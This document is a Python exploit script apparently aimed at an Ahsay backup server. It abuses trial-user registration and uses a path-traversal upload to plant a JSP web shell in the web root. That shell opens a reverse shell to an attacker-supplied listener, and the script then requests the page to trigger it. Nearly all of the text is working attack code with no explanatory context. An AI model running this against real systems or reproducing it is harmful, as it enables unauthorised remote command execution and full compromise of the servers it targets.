import requests
import urllib3
import sys
import base64
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

rhost = sys.argv[1]
rport = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]

if 4 >= len(sys.argv):
	print(f"python3 {sys.argv[0]} TARGET_IP TARGET_PORT LISTENER_HOST LISTENER_PORT")


checkTrial = f"https://{rhost}:{rport}/obs/obm7/user/isTrialEnabled"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
r= requests.post(checkTrial, headers=headers,verify=False)
print("Trial ->",r.text)
if "ENABLE" in r.text:
	print("[+] Trial is enabled!")
else:
	print("[-] Trial is disabled!")
	sys.exit(0)

usr = b"Jvr6v0YK"
passwd = b"testAd9090e!"
user = base64.b64encode(usr)
password = base64.b64encode(passwd)

url = f"https://{rhost}:{rport}/obs/obm7/user/getUserProfile"
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15", "X-RSW-custom-encode-username": user.decode(), "X-RSW-custom-encode-password": password.decode(), "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
r=requests.post(url, headers=headers,verify=False)
if "USER_NOT_EXIST" in r.text:
	print("[+] User not exists! Running exploit...")

url = f"https://{rhost}:{rport}/obs/obm7/user/addTrialUser"
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15", "X-RSW-custom-encode-username": user.decode(), "X-RSW-custom-encode-password": password.decode(), "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
r=requests.post(url, headers=headers,verify=False)
if r.status_code == 200:
	print("[+] Adding user...")
else:
	print("[-] Create trial user failed!")

url = f"https://{rhost}:{rport}/obs/obm7/file/upload"
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15", "X-RSW-Request-0": user.decode(), "X-RSW-Request-1": password.decode(), "X-RSW-custom-encode-path": "Li4vLi4vd2ViYXBwcy9jYnMvaGVscC9lbi9tUmNkSmpDQm1wLmpzcA==", "Connection": "close"}
reverseShell = '''<%@page import="java.lang.*"%>
            <%@page import="java.util.*"%>
            <%@page import="java.io.*"%>
            <%@page import="java.net.*"%>

            <%
            class StreamConnector extends Thread
            {{
                InputStream az;
                OutputStream jk;

                StreamConnector( InputStream az, OutputStream jk )
                {{
                this.az = az;
                this.jk = jk;
                }}

                public void run()
                {{
                BufferedReader vo  = null;
                BufferedWriter ijb = null;
                try
                {{
                    vo  = new BufferedReader( new InputStreamReader( this.az ) );
                    ijb = new BufferedWriter( new OutputStreamWriter( this.jk ) );
                    char buffer[] = new char[8192];
                    int length;
                    while( ( length = vo.read( buffer, 0, buffer.length ) ) > 0 )
                    {{
                    ijb.write( buffer, 0, length );
                    ijb.flush();
                    }}
                }} catch( Exception e ){{}}
                try
                {{
                    if( vo != null )
                    vo.close();
                    if( ijb != null )
                    ijb.close();
                }} catch( Exception e ){{}}
                }}
            }}

            try
            {{
                String ShellPath;
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {{
            ShellPath = new String("/bin/sh");
            }} else {{
            ShellPath = new String("cmd.exe");
            }}

                Socket socket = new Socket( "{0}", {1} );
                Process process = Runtime.getRuntime().exec( ShellPath );
                ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
                ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
            }} catch( Exception e ) {{}}
            %>'''.format(lhost, lport)
r=requests.put(url, headers=headers, data=reverseShell,verify=False)
if r.status_code == 201:
	print("[+] WebShell created!")

burp0_url = f"https://{rhost}:{rport}/cbs/help/en/mRcdJjCBmp.jsp"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15", "Connection": "close"}
requests.get(burp0_url, headers=burp0_headers,verify=False)
